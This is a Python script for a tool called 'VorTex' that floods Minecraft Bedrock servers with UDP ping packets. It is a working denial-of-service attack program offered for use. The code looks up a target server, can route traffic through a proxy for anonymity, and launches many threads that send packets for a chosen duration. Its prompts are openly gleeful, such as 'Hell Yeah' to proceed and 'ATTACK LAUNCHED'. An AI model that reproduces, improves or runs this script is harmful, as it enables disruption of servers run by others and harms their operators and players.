from mcstatus import BedrockServer
import socket
import threading
import time
import os
import pyfiglet
import socks  

# RakNet ping packet
PING_PACKET = b'\x01' + b'\x00' * 17

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def setup_proxy(proxy_ip, proxy_port, proxy_type):
    """Set up proxy for anonymous connection"""
    if proxy_type == "socks5":
        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    elif proxy_type == "socks4":
        socks.set_default_proxy(socks.SOCKS4, proxy_ip, proxy_port)
    elif proxy_type == "http":
        socks.set_default_proxy(socks.HTTP, proxy_ip, proxy_port)
    
    socket.socket = socks.socksocket
    print(f"✅ \033[92mProxy configured: {proxy_ip}:{proxy_port} ({proxy_type})\033[0m")

def remove_proxy():
    """Remove proxy settings"""
    socks.set_default_proxy()
    socket.socket = socket.socket

def show_proxy_warning():
    """Show beta warning for proxy feature"""
    print("\n\033[91m⚠️  BETA FEATURE WARNING:\033[0m")
    print("🔸 \033[93mProxy support is experimental and buggy!\033[0m")
    print("🔸 \033[93mMost proxies don't support UDP packets (Minecraft uses UDP)\033[0m")
    print("🔸 \033[93mThis might completely break the attack - packets may not send!\033[0m")
    print("🔸 \033[93mRecommended: Use VPN for anonymity instead of proxies\033[0m")
    print("🔸 \033[93mPress 'n' for normal (working) mode without proxy\033[0m")
    print("")

def main():
    while True:
        clear_screen()
        banner = pyfiglet.figlet_format("VorTex", font="doom")
        print(f"\033[91m{banner}\033[0m")
        print("                                       version 3.1")
        print("\033[95mCreator: \033[0m Hydra")
        print("")
        
        ip = input("\033[96m🌐 Server IP: \033[0m")
        port = int(input("\033[93m🔌 Server port [default: 19132]: \033[0m") or 19132)
        
        print("\033[93m📡 Fetching server info...\033[0m")
        
        try:
            server = BedrockServer.lookup(f"{ip}:{port}")
            status = server.status()
            
            print(f"✅ \033[92mServer Online!\033[0m")
            print(f"📡 Latency : {round(status.latency, 2)} ms")
            print(f"👥 Players : {status.players.online} / {status.players.max}")
            print(f"🎮 MOTD    : {status.motd.raw}")
            print(f"📝 Version : {status.version.name} (protocol {status.version.protocol})")
            print("")
            
        except:
            print("❌ \033[91mServer appeared to be offline. Try again later\033[0m")
            time.sleep(2)
            continue
        
        ddos_banner = pyfiglet.figlet_format("Proceed?", font="small")
        print(f"\033[93m{ddos_banner}\033[0m")
        print("\033[92m1 = Hell Yeah\033[0m")
        print("\033[91m0 = No, I feel bad\033[0m")
        print("")
        
        choice = input("Choice: ")
        
        if choice != "1":
            continue
        
        # Proxy configuration with BETA warning
        print("\n\033[94m🎭 Proxy Configuration (BETA - BUGGY)\033[0m")
        show_proxy_warning()
        
        use_proxy = input("Risk using proxy? (y/n): ").lower()
        
        proxy_enabled = False
        if use_proxy == 'y':
            print("\n\033[93m🔧 Enter proxy details (at your own risk):\033[0m")
            proxy_type = input("Proxy type (socks5/socks4/http) [socks5]: ").lower() or "socks5"
            proxy_ip = input("Proxy IP address: ")
            proxy_port = int(input("Proxy port: "))
            
            try:
                setup_proxy(proxy_ip, proxy_port, proxy_type)
                proxy_enabled = True
                print("🚀 \033[92mProxy enabled (BETA MODE - MAY NOT WORK)\033[0m\n")
            except Exception as e:
                print(f"❌ \033[91mProxy setup failed: {e}\033[0m")
                print("⚠️  \033[93mFalling back to normal mode without proxy\033[0m\n")
        else:
            print("✅ \033[92mUsing normal mode (recommended - actually works)\033[0m\n")
        
        threads = int(input("\033[92m🤖 Threads (bots): \033[0m"))
        duration = int(input("\033[91m⏱ Duration (seconds): \033[0m"))
        delay = float(input("\033[94m⚡ Delay between packets (e.g., 0.1 = fast): \033[0m"))

        stop_time = time.time() + duration
        packets_sent = 0
        packets_lock = threading.Lock()

        print(f"\n\033[93m🎯 Target: {ip}:{port}\033[0m")
        print(f"\033[93m📊 Duration: {duration} seconds | Threads: {threads}\033[0m")
        
        if proxy_enabled:
            print("\033[91m🔧 Mode: BETA PROXY (packets may not send!)\033[0m")
        else:
            print("\033[92m🔧 Mode: NORMAL (should work properly)\033[0m")
        
        print("\n\033[91m💥 STARTING ATTACK IN 3...\033[0m")
        time.sleep(1)
        print("\033[93m💥 STARTING ATTACK IN 2...\033[0m")
        time.sleep(1)
        print("\033[92m💥 STARTING ATTACK IN 1...\033[0m")
        time.sleep(1)
        
        if proxy_enabled:
            print("\033[91m🚀 ATTACK LAUNCHED! (BETA PROXY MODE - WISH US LUCK!)\033[0m\n")
        else:
            print("\033[91m🚀 ATTACK LAUNCHED! Sending packets...\033[0m\n")

        def send_ping():
            nonlocal packets_sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < stop_time:
                try:
                    sock.sendto(PING_PACKET, (ip, port))
                    with packets_lock:
                        packets_sent += 1
                    time.sleep(delay)
                except Exception as e:
                    if proxy_enabled:
                        # Don't spam errors in proxy mode - it's expected to fail
                        pass
                    else:
                        print(f"\033[91m[!] Error: {e}\033[0m")
                    break
            sock.close()

        # Progress monitoring function
        def monitor_progress():
            start_time = time.time()
            while time.time() < stop_time:
                elapsed = time.time() - start_time
                progress = min((elapsed / duration) * 100, 100)
                
                bar_length = 30
                filled_length = int(bar_length * progress / 100)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                pps = packets_sent / elapsed if elapsed > 0 else 0
                
                mode_indicator = "🔧 BETA" if proxy_enabled else "✅ NORMAL"
                print(f"\r\033[94m{mode_indicator} | Progress: [{bar}] {progress:.1f}% | ⏱ {elapsed:.0f}s/{duration}s | 📦 {packets_sent} packets | 🚀 {pps:.1f} p/s\033[0m", end='', flush=True)
                time.sleep(0.5)
            
            # Final update
            elapsed = time.time() - start_time
            pps = packets_sent / elapsed if elapsed > 0 else 0
            bar = '█' * 30
            mode_indicator = "🔧 BETA" if proxy_enabled else "✅ NORMAL"
            print(f"\r\033[94m{mode_indicator} | Progress: [{bar}] 100.0% | ⏱ {elapsed:.0f}s/{duration}s | 📦 {packets_sent} packets | 🚀 {pps:.1f} p/s\033[0m")

        # Start attack threads
        attack_threads = []
        for _ in range(threads):
            thread = threading.Thread(target=send_ping)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)

        # Start progress monitor
        progress_thread = threading.Thread(target=monitor_progress)
        progress_thread.daemon = True
        progress_thread.start()

        # Wait for attack to complete
        progress_thread.join()

        print(f"\n\n\033[92m✅ Attack completed!\033[0m")
        print(f"\033[94m📊 Final Stats: {packets_sent} total packets sent\033[0m")
        
        if proxy_enabled:
            if packets_sent == 0:
                print("\033[91m❌ Proxy mode failed - no packets sent (as expected)\033[0m")
            else:
                print("\033[92m🎉 Surprisingly, proxy mode actually worked!\033[0m")
        
        # Reset proxy if it was enabled
        if proxy_enabled:
            remove_proxy()

        # Ask user if they want to continue
        print("\n\033[93m" + "="*50 + "\033[0m")
        print("\033[94m🔄 Operation Complete\033[0m")
        print("\033[93m" + "="*50 + "\033[0m")
        print("\033[92mPress ENTER to launch another attack\033[0m")
        print("\033[91mType 'exit' or 'quit' to close the tool\033[0m")
        
        continue_choice = input("\n\033[96mYour choice: \033[0m").lower().strip()
        
        if continue_choice in ['exit', 'quit', 'no', 'n']:
            print("\n\033[91m👋 Closing VorTex tool... Goodbye!\033[0m")
            break

if __name__ == "__main__":

    main()
